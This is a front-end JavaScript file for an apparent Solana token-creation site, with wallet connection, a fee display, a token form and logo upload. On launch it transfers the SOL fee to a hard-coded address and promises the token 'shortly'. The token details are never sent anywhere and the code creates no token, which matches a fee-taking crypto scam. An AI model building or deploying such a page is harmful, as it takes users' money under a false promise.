document.addEventListener('DOMContentLoaded', function() {
    // ======================
    // SECTION 1: FEE CALCULATION
    // ======================
    const socialToggle = document.getElementById('social-links-toggle');
    const feeInfo = document.getElementById('fee-info');
    let baseFee = 0.3;
    let socialFee = 0.1;
    let totalFee = baseFee;

    function updateFeeDisplay() {
        const additionalFees = [];
        
        if (socialToggle.checked) {
            additionalFees.push({ name: 'Social Links', value: socialFee });
        }
        
        totalFee = baseFee + additionalFees.reduce((sum, fee) => sum + fee.value, 0);
        
        feeInfo.innerHTML = `
            <div class="base-fee">Base fee: <span>${baseFee} SOL</span></div>
            ${additionalFees.map(fee => `
                <div class="fee-item">
                    <span>${fee.name}:</span>
                    <span class="fee-value">+${fee.value} SOL</span>
                </div>
            `).join('')}
            <div class="total-fee">Total: ${totalFee} SOL</div>
        `;
    }

    socialToggle.addEventListener('change', updateFeeDisplay);
    updateFeeDisplay();

    // ======================
    // SECTION 2: WALLET INTEGRATION
    // ======================
    const NETWORK = solanaWeb3.clusterApiUrl('mainnet-beta');
    const RECIPIENT_ADDRESS = '69vedYimF9qjVMosphWbRTBffYxAzNAvLkWDmtnSBiWq';
    let wallet;
    let connection = new solanaWeb3.Connection(NETWORK, 'confirmed');

    async function initWallet() {
        if (!window.solana?.isPhantom) {
            alert('Please install Phantom Wallet!');
            return;
        }

        wallet = window.solana;
        
        wallet.on('connect', () => {
            const connectBtn = document.getElementById('connect-wallet');
            const walletAddress = document.getElementById('wallet-address');
            
            connectBtn.textContent = 'Connected';
            connectBtn.classList.add('connected');
            
            const shortAddress = `${wallet.publicKey.toString().slice(0, 4)}...${wallet.publicKey.toString().slice(-4)}`;
            walletAddress.textContent = shortAddress;
            walletAddress.style.display = 'block';
        });

        wallet.on('disconnect', () => {
            const connectBtn = document.getElementById('connect-wallet');
            const walletAddress = document.getElementById('wallet-address');
            
            connectBtn.textContent = 'Connect Wallet';
            connectBtn.classList.remove('connected');
            walletAddress.style.display = 'none';
        });

        document.getElementById('connect-wallet').addEventListener('click', async () => {
            try {
                if (!wallet.connected) {
                    await wallet.connect();
                } else {
                    await wallet.disconnect();
                }
            } catch (error) {
                console.error("Wallet error:", error);
                alert("Wallet error: " + error.message);
            }
        });

        if (wallet.connected) {
            wallet.emit('connect');
        }
    }

    // ======================
    // SECTION 3: TOKEN CREATION FORM
    // ======================
    function initTokenForm() {
        const launchBtn = document.getElementById('launch-btn');
        
        // Toggle social fields
        document.getElementById('social-links-toggle').addEventListener('change', function() {
            document.getElementById('social-fields').style.display = this.checked ? 'block' : 'none';
        });

        launchBtn.addEventListener('click', async function() {
            // Validate wallet connection
            if (!wallet?.connected) {
                alert('Please connect your wallet first');
                return;
            }

            // Validate form inputs
            const tokenName = document.getElementById('token-name').value.trim();
            const tokenSymbol = document.getElementById('token-symbol').value.trim();
            const tokenSupply = document.getElementById('token-supply').value;
            
            if (!tokenName || tokenName.length > 32) {
                alert('Token name must be 1-32 characters');
                return;
            }

            if (!tokenSymbol || tokenSymbol.length > 10) {
                alert('Token symbol must be 1-10 characters');
                return;
            }

            if (!tokenSupply || isNaN(tokenSupply) || tokenSupply <= 0) {
                alert('Please enter a valid token supply');
                return;
            }

            try {
                // Get amount from fee display
                const amount = parseFloat(document.querySelector('.total-fee').textContent.match(/[\d.]+/)[0]);
                
                // Create transaction
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: wallet.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(RECIPIENT_ADDRESS),
                        lamports: solanaWeb3.LAMPORTS_PER_SOL * amount
                    })
                );

                // Set transaction parameters
                const { blockhash } = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = wallet.publicKey;

                // Send to Phantom for signing
                const { signature } = await wallet.signAndSendTransaction(transaction);
                
                // Show success message
                alert(`Transaction submitted!\nSignature: ${signature}`);
                
                // Wait for confirmation
                const confirmation = await connection.confirmTransaction(signature, 'confirmed');
                if (confirmation.value.err) {
                    throw new Error('Transaction failed');
                }
                
                alert('Transaction confirmed! Your token will be created shortly.');

            } catch (error) {
                console.error("Transaction error:", error);
                alert("Transaction failed: " + error.message);
            }
        });
    }

    // ======================
    // SECTION 4: LOGO UPLOAD
    // ======================
    function initLogoUpload() {
        const uploadArea = document.getElementById('logo-upload-area');
        const fileInput = document.createElement('input');
        fileInput.type = 'file';
        fileInput.accept = 'image/*';
        fileInput.hidden = true;
        document.body.appendChild(fileInput);

        uploadArea.addEventListener('click', () => fileInput.click());

        // Handle drag and drop
        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.classList.add('dragover');
        });

        uploadArea.addEventListener('dragleave', () => {
            uploadArea.classList.remove('dragover');
        });

        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
            if (e.dataTransfer.files.length) {
                fileInput.files = e.dataTransfer.files;
                handleFileSelect(fileInput.files[0]);
            }
        });

        fileInput.addEventListener('change', () => {
            if (fileInput.files.length) {
                handleFileSelect(fileInput.files[0]);
            }
        });

        function handleFileSelect(file) {
            if (!file.type.match('image.*')) {
                alert('Please select an image file');
                return;
            }

            const reader = new FileReader();
            reader.onload = (e) => {
                uploadArea.innerHTML = '';
                const img = document.createElement('img');
                img.src = e.target.result;
                img.style.maxWidth = '100%';
                img.style.maxHeight = '100%';
                img.style.objectFit = 'contain';
                uploadArea.appendChild(img);
            };
            reader.readAsDataURL(file);
        }
    }

    // ======================
    // SECTION 5: NAVIGATION
    // ======================
    function initNavigation() {
        const sections = document.querySelectorAll('section');
        const navLinks = document.querySelectorAll('.nav-link');

        function showSection(sectionId) {
            // Hide all sections
            sections.forEach(section => {
                section.classList.remove('active-section');
                section.classList.add('hidden-section');
            });
            
            // Show selected section
            const targetSection = document.getElementById(sectionId);
            if (targetSection) {
                targetSection.classList.remove('hidden-section');
                targetSection.classList.add('active-section');
            }
            
            // Update active nav links
            navLinks.forEach(link => {
                link.classList.remove('active');
                if (link.getAttribute('href') === `#${sectionId}`) {
                    link.classList.add('active');
                }
            });
        }

        // Handle nav link clicks
        navLinks.forEach(link => {
            link.addEventListener('click', function(e) {
                const href = this.getAttribute('href');
                if (href.startsWith('#')) {
                    e.preventDefault();
                    showSection(href.substring(1));
                    history.pushState(null, null, href);
                }
            });
        });

        // Handle home page button
        const homeCreateBtn = document.querySelector('.create-token-btn');
        if (homeCreateBtn) {
            homeCreateBtn.addEventListener('click', function(e) {
                e.preventDefault();
                showSection('create-token');
                history.pushState(null, null, '#create-token');
            });
        }

        // Handle browser history
        window.addEventListener('popstate', function() {
            const hash = window.location.hash.substring(1);
            showSection(hash || 'home');
        });

        // Initialize first section
        showSection(window.location.hash.substring(1) || 'home');
    }

    // ======================
    // INITIALIZE APP
    // ======================
    initWallet();
    initNavigation();
    initTokenForm();
    initLogoUpload();
});
